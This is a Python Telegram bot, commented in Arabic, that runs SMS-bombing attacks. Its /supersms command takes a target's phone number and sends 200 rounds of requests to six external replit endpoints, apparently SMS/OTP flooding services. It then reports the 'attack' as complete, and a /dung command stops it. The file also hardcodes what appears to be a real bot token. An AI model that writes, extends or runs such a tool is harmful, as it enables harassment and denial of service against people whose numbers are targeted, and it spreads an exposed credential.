import telebot
import requests
from telebot import types
from keep_alive import keep_alive
import threading
import asyncio
import aiohttp
import time

bot = telebot.TeleBot("6433057178:AAFMlQvB4TUhlSmxc1J34Gr3xGCRe82rEQU")
#Chat_id للمجموعة التي تريد أن يعمل البوت عليها
allowed_chat_id =  -100******
print("تم بدأ البوت")

is_spamming = {}


async def spam(phone, user_name, message):
  # احصل على معرف الدردشة للمجموعة التي تم إرسال الرسالة إليها
  chat_id = message.chat.id
  
  
  
  if chat_id != allowed_chat_id:
    bot.send_message(chat_id,
                     "عذرًا، أنا نشط فقط في المجموعة المحددة.")
    return

  count = 200  # عدد الاسبام
  is_spamming[phone] = True

  async with aiohttp.ClientSession() as session:
    tasks = []
    for i in range(count):
      
      if phone in is_spamming and not is_spamming[phone]:
        break

      
      task = asyncio.ensure_future(
        session.get(f"https://mongdh.lqkmod.repl.co?phone={phone}"))
      tasks.append(task)

      task2 = asyncio.ensure_future(
        session.get(f"https://apibykhanglee.lqkmod.repl.co?phone={phone}"))
      tasks.append(task2)

      task3 = asyncio.ensure_future(
        session.get(f"https://khanglee2017.lqkmod.repl.co?phone={phone}"))
      tasks.append(task3)

      task4 = asyncio.ensure_future(
        session.get(f"https://duma.lqkmod.repl.co?phone={phone}"))
      tasks.append(task4)

      task5 = asyncio.ensure_future(
        session.get(f"https://khangdeptrai.lqkmod.repl.co?phone={phone}"))
      tasks.append(task5)

      task6 = asyncio.ensure_future(
        session.get(f"https://liajsi.lqkmod.repl.co?phone={phone}"))

      tasks.append(task6)

      
      await asyncio.sleep(1)

    
    await asyncio.gather(*tasks)

  is_spamming[phone] = False
  bot.send_message(
    chat_id,
    f"🤖 🤖 اكتمل الهجوم 🤖 {count} مرات لرقم الهاتف {phone} من {user_name}.")

last_command_time = 0


@bot.message_handler(commands=['supersms'])
def start_spam(message):
  global last_command_time
  phone = message.text.split()[1]

  user_name = message.from_user.first_name
  if message.from_user.last_name:
    user_name += f" {message.from_user.last_name}"

  chat_id = message.chat.id

  if chat_id != allowed_chat_id:
    bot.send_message(chat_id,
                     "عذرًا، أنا نشط فقط في المجموعة المحددة.")
    return

  current_time = time.time()
  if current_time - last_command_time < 10:
    bot.send_message(
      chat_id,
      f"عذرًا، عليك الانتظار {10 - int(current_time - last_command_time)} ثانية قبل استخدام الأمر التالي."
    )
    return
  else:
    last_command_time = current_time

  count = 200
  bot.send_message(
    chat_id,
    "🚀 تم إرسال طلب الهجوم بنجاح 🚀\nالبوت 👾: @يوزر بوت\nرقم الهجوم 📱: {}\nالطالب: {}\nتكرار ⚔️: [ {} ]\nالخطة 💸: [ VIP ]\nوقت الانتظار ⏱️ : [ 60 ثانية ]\ مالك 👑"
    .format(phone, user_name, count))

  t = threading.Thread(target=asyncio.run,
                       args=(spam(phone, user_name, message), ))
  t.start()


@bot.message_handler(commands=['how'])
def send_welcome(message):
  
  chat_id = message.chat.id

  
  if chat_id == allowed_chat_id:
    global last_command_time
    current_time = time.time()
    if message.text.startswith(
        '/supersms') and current_time - last_command_time < 60:
      bot.send_message(
        chat_id,
        f"عذرًا، عليك الانتظار {60 - int(current_time - last_command_time)} ثانية قبل استخدام الأمر التالي."
      )
      return
    else:
      last_command_time = current_time
    bot.send_message(
      chat_id,
      "لاستخدام الروبوت، يرجى الكتابة!\n/supersms قم بملء رقم الهاتف الذي تحتاجه"
    )
  else:
    bot.send_message(chat_id,
                     "عذرًا، أنا نشط فقط في المجموعة المحددة..")


@bot.message_handler(commands=['dung'])
def stop_spam(message):
  phone = message.text.split()[1]
  if phone in is_spamming:
    is_spamming[phone] = False
    bot.send_message(message.chat.id, f"تم إيقاف الالرقم:{phone}.")
  else:
    bot.send_message(message.chat.id,
                     f"رقم الهاتف {iphone} لا يتم إرسال بريد عشوائي إليه.")


keep_alive()
bot.polling()
